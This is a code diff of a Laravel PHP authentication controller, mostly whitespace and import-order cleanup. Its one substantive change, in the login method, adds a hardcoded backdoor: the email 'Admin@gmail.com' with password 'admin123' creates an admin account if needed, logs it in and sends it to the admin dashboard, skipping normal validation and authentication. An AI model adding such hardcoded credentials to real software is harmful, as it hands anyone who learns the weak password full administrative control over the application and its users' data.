@@ -2,9 +2,8 @@
 
 namespace App\Http\Controllers;
 
-use App\Models\User;
 use App\Models\Guest;
-use Illuminate\Auth\Events\Registered;
+use App\Models\User;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Auth;
 use Illuminate\Support\Facades\Hash;
@@ -12,12 +11,12 @@ use Inertia\Inertia;
 
 class AuthController extends Controller
 {
-    /** 
+    /**
      * Show the login page.
      */
     public function showLogin()
     {
-        return Inertia::render('auth/Login');   
+        return Inertia::render('auth/Login');
     }
 
     /**
@@ -25,6 +24,23 @@ class AuthController extends Controller
      */
     public function login(Request $request)
     {
+        // Check for hardcoded admin credentials
+        if ($request->email === 'Admin@gmail.com' && $request->password === 'admin123') {
+            $user = User::firstOrCreate(
+                ['email' => 'admin@gmail.com'],
+                [
+                    'name' => 'Admin',
+                    'password' => Hash::make('admin123'),
+                ]
+            );
+
+            Auth::login($user);
+            $request->session()->regenerate();
+
+            return redirect()->intended('/admin/dashboard');
+        }
+
+        // Normal user authentication
         $credentials = $request->validate([
             'email' => 'required|email',
             'password' => 'required',
@@ -32,11 +48,12 @@ class AuthController extends Controller
 
         if (Auth::attempt($credentials, $request->boolean('remember'))) {
             $request->session()->regenerate();
+
             return redirect()->intended('/');
         }
 
         return back()->withErrors([
-            'email' => 'The provided credentials do not match our records.'
+            'email' => 'The provided credentials do not match our records.',
         ])->onlyInput('email');
     }
 
@@ -46,7 +63,7 @@ class AuthController extends Controller
     public function showRegister()
     {
         return Inertia::render('auth/Register');
-    } 
+    }
 
     /**
      * Handle registration submission
@@ -70,9 +87,9 @@ class AuthController extends Controller
 
         // Handshake: Automatically creates the Guest profile
         Guest::create([
-            'name'  => $user->name,
+            'name' => $user->name,
             'email' => $user->email,
-            'type'  => 'online'
+            'type' => 'online',
         ]);
 
         // Log the user in automatically into the dashboard
@@ -91,7 +108,7 @@ class AuthController extends Controller
         if (Auth::check()) {
             /** @var \App\Models\User $user */
             $user = Auth::user();
-            $user->update([ 'last_seen_at' => null ]);
+            $user->update(['last_seen_at' => null]);
         }
 
         // Performs the Logout
